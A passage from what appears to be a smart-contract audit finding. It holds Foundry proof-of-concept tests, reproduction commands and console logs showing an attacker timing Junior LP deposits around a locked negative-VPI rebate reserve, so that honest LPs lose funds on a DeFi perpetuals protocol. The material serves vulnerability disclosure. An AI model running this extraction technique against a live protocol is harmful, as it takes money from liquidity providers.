    ///         the honest Junior is not harmed: the profit in the attack comes purely from the LP deposit timing.
    function test_Control_TraderOnlyRoundTrip() public {
        _openLong(HLONG);
        _warpTo(_now() + 60);
        uint256 hon0 = _honestJuniorValue();
        int256 att0 = _attackerPnl();
        (int256 vpi, int256 navOpen) = _openRebateShort();
        _warpTo(_now() + 60);
        (int256 closeVpi, int256 navClose) = _closeShort();
        _pokeMark();
        int256 att = _attackerPnl() - att0;
        int256 hon = int256(_honestJuniorValue()) - int256(hon0);
        console2.log("rebate", vpi);
        console2.log("NAV on open", navOpen);
        console2.log("NAV on close", navClose);
        console2.log("close VPI", closeVpi);
        console2.log("trader-only attacker PnL", att);
        console2.log("trader-only honest Junior PnL", hon);
        assertLt(att, 0, "trader alone loses fees");
        assertGe(hon, 0, "honest Junior not harmed without the LP leg");
    }

    /// @notice No honest flow needed: the attacker opens the long itself once, farms the rebate window N times, then
    ///         closes the long (its VPI round-trips to ~0 at equal depth). Everything is attacker-owned.
    function test_PoC_SelfMadeSkew() public {
        _mintAttacker(ALONG, 400_000e6);
        vm.startPrank(ALONG);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(ALONG, 400_000e6);
        vm.stopPrank();
        uint256 hon0 = _honestJuniorValue();
        int256 att0 = _attackerPnl();

        _openLong(ALONG);
        _warpTo(_now() + 60);
        (int256 att, int256 hon) = _run(8, 4_250_000e6, true);
        _pokeMark();
        _closeLong(ALONG);
        _pokeMark();
        int256 total = _attackerPnl() - att0;
        int256 honTotal = int256(_honestJuniorValue()) - int256(hon0);
        console2.log("=== self-made skew, 8 cycles");
        console2.log("cycles: attacker PnL", att);
        console2.log("cycles: honest Junior PnL", hon);
        console2.log("TOTAL attacker PnL incl. long open/close (atoms)", total);
        console2.log("TOTAL honest Junior PnL (atoms)", honTotal);
        assertGt(total, 0, "self-contained attack is profitable at a constant price");
        assertLt(honTotal, 0, "honest Junior LPs lose principal");
    }

    /// @notice A passive Junior LP realizes the difference in actual USDG,
    /// not only in a mark-to-NAV estimate. Both branches use the same initial
    /// pre-existing LONG and the same number of short/rebate round trips.
    /// The attack branch prices incoming LP shares while the reserve is locked;
    /// the control settles the reserve before the incoming LP shares are priced.
    function test_Final_PassiveJuniorActualCashWithdrawal_AttackVsControl() public {
        _openLong(HLONG);
        _warpTo(_now() + 60);
        uint256 snap = vm.snapshotState();

        _run(1, 4_250_000e6, true);
        uint256 shares = juniorVault.balanceOf(address(this)) / 10;
        assertGt(shares, 0, "passive LP owns no shares");
        uint256 cashAttack = _redeemPassiveShares(shares);
        assertTrue(vm.revertToState(snap), "snapshot restore failed");

        _run(1, 4_250_000e6, false);
        uint256 cashControl = _redeemPassiveShares(shares);
        console2.log("FINAL passive shares redeemed", shares);
        console2.log("FINAL passive cash received with reserve-window entry", cashAttack);
        console2.log("FINAL passive cash received in control", cashControl);
        console2.log("FINAL passive realized USDG shortfall (atoms)", cashControl - cashAttack);
        assertGt(cashControl, cashAttack, "no cash transfer from existing Junior LP");
    }

    function _redeemPassiveShares(uint256 shares) internal returns (uint256 received) {
        uint256 e = _nextEpochStart();
        assertLt(_now(), e - 300, "passive redemption must be before cutoff");
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        _warpTo(e + 10);
        _settle();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
        assertEq(claimable, shares, "passive redemption not fully funded");
        uint256 beforeBalance = settlementToken.balanceOf(address(this));
        juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
        received = settlementToken.balanceOf(address(this)) - beforeBalance;
        assertGt(received, 0, "zero realized passive cash redemption");
    }

}
```

## Commands

I ran the following from the repository root:

```bash
# Audited code
git rev-parse HEAD
# Expected: a82d4fefb02768e5b3bddcc97dee371eee24fea8

# Foundry release used for this reproduction
forge --version
# 1.5.1

forge test \
  --root packages/perps \
  --match-path 'test/perps/insight/Cohort_negvpimirror_MatchedTiming.t.sol' \
  -vv

# Verify the production contracts were not changed
git diff -- packages/perps/src
```

## Observed Console Output

The following is the output from the final four-test matched-timing run. USDG amounts in the event and PnL logs are six-decimal token atoms unless the surrounding text explicitly converts them to USDG.

```text
Ran 4 tests for test/perps/insight/Cohort_negvpimirror_MatchedTiming.t.sol:CohortNegVpiMatchedTimingPoC
[PASS] test_Control_TraderOnlyRoundTrip() (gas: 7335069)
Logs:
  FINAL physical USDG recovered by HousePool (atoms) 2601198315
  FINAL negative VPI reserve before close (atoms) 2599121038
  rebate -2599121038
  NAV on open -2599127383
  NAV on close 2601192722
  close VPI 2601198316
  trader-only attacker PnL -1042683150
  trader-only honest Junior PnL 1723447

[PASS] test_Final_PassiveJuniorActualCashWithdrawal_AttackVsControl() (gas: 17114680)
Logs:
  FINAL physical USDG recovered by HousePool (atoms) 2599121038
  FINAL negative VPI reserve before close (atoms) 2599121038
  ---- cycle 1
    attacker share of Junior f (bps) 8504
    short lifetime VPI after open (atoms) -2599121038
    vpiRebateReserve while open (atoms) 2599121038
    Junior NAV change on rebate open -2599127382
    close VPI delta (clawback) 2599121038
    Junior NAV change on close 2599115009
    attacker PnL this cycle (atoms) 1130627790
    honest Junior PnL this cycle -2239467136
  FINAL physical USDG recovered by HousePool (atoms) 2601196218
  FINAL negative VPI reserve before close (atoms) 2599121038
  ---- cycle 1
    attacker share of Junior f (bps) 8500
    short lifetime VPI after open (atoms) -2599121038
    vpiRebateReserve while open (atoms) 2599121038
    Junior NAV change on rebate open -2599127382
    close VPI delta (clawback) 2601196218
    Junior NAV change on close 2605937051
    attacker PnL this cycle (atoms) -1084187130
    honest Junior PnL this cycle -24652207
  FINAL passive shares redeemed 75100684906253
  FINAL passive cash received with reserve-window entry 74754698817
  FINAL passive cash received in control 74976180310
  FINAL passive realized USDG shortfall (atoms) 221481493

[PASS] test_PoC_HonestSkew_AttackVsControl() (gas: 50810884)
Logs:
  FINAL physical USDG recovered by HousePool (atoms) 2599121038
  FINAL negative VPI reserve before close (atoms) 2599121038
  ---- cycle 1
    attacker share of Junior f (bps) 8504
    short lifetime VPI after open (atoms) -2599121038
    vpiRebateReserve while open (atoms) 2599121038
    Junior NAV change on rebate open -2599127382
    close VPI delta (clawback) 2599121038
    Junior NAV change on close 2599115009
    attacker PnL this cycle (atoms) 1130627790
    honest Junior PnL this cycle -2239467136
  FINAL physical USDG recovered by HousePool (atoms) 2600856103
  FINAL negative VPI reserve before close (atoms) 2600856103
  ---- cycle 2
    attacker share of Junior f (bps) 8508
    short lifetime VPI after open (atoms) -2600856103
    vpiRebateReserve while open (atoms) 2600856103
    Junior NAV change on rebate open -2600862457
    close VPI delta (clawback) 2600856103
    Junior NAV change on close 2600850075
    attacker PnL this cycle (atoms) 1133072860
    honest Junior PnL this cycle -2242259583
  FINAL physical USDG recovered by HousePool (atoms) 2602595445
  FINAL negative VPI reserve before close (atoms) 2602595445
  ---- cycle 3
    attacker share of Junior f (bps) 8512
    short lifetime VPI after open (atoms) -2602595445
    vpiRebateReserve while open (atoms) 2602595445
    Junior NAV change on rebate open -2602601800
    close VPI delta (clawback) 2602595445
    Junior NAV change on close 2602589417
    attacker PnL this cycle (atoms) 1135530248
    honest Junior PnL this cycle -2244718850
  FINAL physical USDG recovered by HousePool (atoms) 2604339085
  FINAL negative VPI reserve before close (atoms) 2604339085
  ---- cycle 4
    attacker share of Junior f (bps) 8516
    short lifetime VPI after open (atoms) -2604339085
    vpiRebateReserve while open (atoms) 2604339085
    Junior NAV change on rebate open -2604345439
    close VPI delta (clawback) 2604339085
    Junior NAV change on close 2604333057
    attacker PnL this cycle (atoms) 1137994689
    honest Junior PnL this cycle -2247185172
  FINAL physical USDG recovered by HousePool (atoms) 2601196218
  FINAL negative VPI reserve before close (atoms) 2599121038
  ---- cycle 1
    attacker share of Junior f (bps) 8500
    short lifetime VPI after open (atoms) -2599121038
    vpiRebateReserve while open (atoms) 2599121038
    Junior NAV change on rebate open -2599127382
    close VPI delta (clawback) 2601196218
    Junior NAV change on close 2605937051
    attacker PnL this cycle (atoms) -1084187130
    honest Junior PnL this cycle -24652207
  FINAL physical USDG recovered by HousePool (atoms) 2601161265
  FINAL negative VPI reserve before close (atoms) 2599086198
  ---- cycle 2
    attacker share of Junior f (bps) 8500
    short lifetime VPI after open (atoms) -2599086198
    vpiRebateReserve while open (atoms) 2599086198
    Junior NAV change on rebate open -2599092552
    close VPI delta (clawback) 2601161265
    Junior NAV change on close 4773762
    attacker PnL this cycle (atoms) -1084225126
    honest Junior PnL this cycle -24961596
  FINAL physical USDG recovered by HousePool (atoms) 2601126312
  FINAL negative VPI reserve before close (atoms) 2599051328
  ---- cycle 3
    attacker share of Junior f (bps) 8500
    short lifetime VPI after open (atoms) -2599051328
    vpiRebateReserve while open (atoms) 2599051328
    Junior NAV change on rebate open -2599057683
    close VPI delta (clawback) 2601126312
    Junior NAV change on close 4773680
    attacker PnL this cycle (atoms) -1084226303
    honest Junior PnL this cycle -24962300
  FINAL physical USDG recovered by HousePool (atoms) 2601091358
  FINAL negative VPI reserve before close (atoms) 2599016459
  ---- cycle 4
    attacker share of Junior f (bps) 8500
    short lifetime VPI after open (atoms) -2599016459
    vpiRebateReserve while open (atoms) 2599016459
    Junior NAV change on rebate open -2599022813
    close VPI delta (clawback) 2601091359
    Junior NAV change on close 4773594
    attacker PnL this cycle (atoms) -1084227477
    honest Junior PnL this cycle -24963006
  === honest skew, 4 cycles, attacker LP 4.25M
  ATTACK  attacker cumulative PnL (atoms) 4537225587
  ATTACK  honest Junior cumulative PnL -8973630741
  CONTROL attacker cumulative PnL (atoms) -4336866036
  CONTROL honest Junior cumulative PnL -99539109
  honest Junior loss attributable to attack (atoms) 8874091632

[PASS] test_PoC_SelfMadeSkew() (gas: 51735684)
Logs:
  FINAL physical USDG recovered by HousePool (atoms) 2599121038
  FINAL negative VPI reserve before close (atoms) 2599121038
  ---- cycle 1
    attacker share of Junior f (bps) 8504
    short lifetime VPI after open (atoms) -2599121038
    vpiRebateReserve while open (atoms) 2599121038
    Junior NAV change on rebate open -2599127382
    close VPI delta (clawback) 2599121038
    Junior NAV change on close 2599115009
    attacker PnL this cycle (atoms) 1130627790
    honest Junior PnL this cycle -2239467136
  FINAL physical USDG recovered by HousePool (atoms) 2600856103
  FINAL negative VPI reserve before close (atoms) 2600856103
  ---- cycle 2
    attacker share of Junior f (bps) 8508
    short lifetime VPI after open (atoms) -2600856103
    vpiRebateReserve while open (atoms) 2600856103
    Junior NAV change on rebate open -2600862457
    close VPI delta (clawback) 2600856103
    Junior NAV change on close 2600850075
    attacker PnL this cycle (atoms) 1133072860
    honest Junior PnL this cycle -2242259583
  FINAL physical USDG recovered by HousePool (atoms) 2602595445
  FINAL negative VPI reserve before close (atoms) 2602595445
  ---- cycle 3
    attacker share of Junior f (bps) 8512
    short lifetime VPI after open (atoms) -2602595445
    vpiRebateReserve while open (atoms) 2602595445
    Junior NAV change on rebate open -2602601800
    close VPI delta (clawback) 2602595445
    Junior NAV change on close 2602589417
    attacker PnL this cycle (atoms) 1135530248
    honest Junior PnL this cycle -2244718850
  FINAL physical USDG recovered by HousePool (atoms) 2604339085
  FINAL negative VPI reserve before close (atoms) 2604339085
  ---- cycle 4
    attacker share of Junior f (bps) 8516
    short lifetime VPI after open (atoms) -2604339085
    vpiRebateReserve while open (atoms) 2604339085
    Junior NAV change on rebate open -2604345439
    close VPI delta (clawback) 2604339085
    Junior NAV change on close 2604333057
    attacker PnL this cycle (atoms) 1137994689
    honest Junior PnL this cycle -2247185172
  FINAL physical USDG recovered by HousePool (atoms) 2606087042
  FINAL negative VPI reserve before close (atoms) 2606087042
  ---- cycle 5
    attacker share of Junior f (bps) 8520
    short lifetime VPI after open (atoms) -2606087042
    vpiRebateReserve while open (atoms) 2606087042
    Junior NAV change on rebate open -2606093397
    close VPI delta (clawback) 2606087042
    Junior NAV change on close 2606081014
    attacker PnL this cycle (atoms) 1140466007
    honest Junior PnL this cycle -2249658370
  FINAL physical USDG recovered by HousePool (atoms) 2607839333
  FINAL negative VPI reserve before close (atoms) 2607839333
  ---- cycle 6
    attacker share of Junior f (bps) 8523
    short lifetime VPI after open (atoms) -2607839333
    vpiRebateReserve while open (atoms) 2607839333
    Junior NAV change on rebate open -2607845688
    close VPI delta (clawback) 2607839333
    Junior NAV change on close 2607833304
    attacker PnL this cycle (atoms) 1142944335
    honest Junior PnL this cycle -2252138580
  FINAL physical USDG recovered by HousePool (atoms) 2609595977
  FINAL negative VPI reserve before close (atoms) 2609595977
  ---- cycle 7
    attacker share of Junior f (bps) 8527
    short lifetime VPI after open (atoms) -2609595977
    vpiRebateReserve while open (atoms) 2609595977
    Junior NAV change on rebate open -2609602332
    close VPI delta (clawback) 2609595977
    Junior NAV change on close 2609589948
    attacker PnL this cycle (atoms) 1145429814
    honest Junior PnL this cycle -2254625937
  FINAL physical USDG recovered by HousePool (atoms) 2611356994
  FINAL negative VPI reserve before close (atoms) 2611356994
  ---- cycle 8
    attacker share of Junior f (bps) 8531
    short lifetime VPI after open (atoms) -2611356994
    vpiRebateReserve while open (atoms) 2611356994
    Junior NAV change on rebate open -2611363349
    close VPI delta (clawback) 2611356994
    Junior NAV change on close 2611350965
    attacker PnL this cycle (atoms) 1147922265
    honest Junior PnL this cycle -2257120269
  === self-made skew, 8 cycles
  cycles: attacker PnL 9113988008
  cycles: honest Junior PnL -17987173897
  TOTAL attacker PnL incl. long open/close (atoms) 8032720068
  TOTAL honest Junior PnL (atoms) -17426592038

Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 316.37ms (520.23ms CPU time)

Ran 1 test suite in 319.03ms (316.37ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
```

## What the PoC Proves

The test establishes four points with executed contract actions. First, the same skew-reducing short produces the same negative-VPI amount and the same locked reserve before the attack and control branches diverge. Second, the `AssetSeized` logs confirm the clearinghouse physically sends the protected USDG back to HousePool on close. Third, the only intended difference in the matched single-cycle control is whether the deposit shares are priced before or after that recovery; the resulting attacker gain and passive Junior loss are almost exactly equal and opposite. Fourth, a real redemption of passive Junior shares pays **221.481493 USDG less** in the attack branch, and the self-contained eight-cycle test confirms that the attacker can build the initial skew and finish profitable after the long is closed.

The failure is therefore not an oracle issue, a fabricated terminal NAV quote, or a trader-only rebate round trip. It is an LP share-pricing window that transfers the value of an already-backed negative-VPI recovery from the Junior LPs who funded it to an incoming LP.

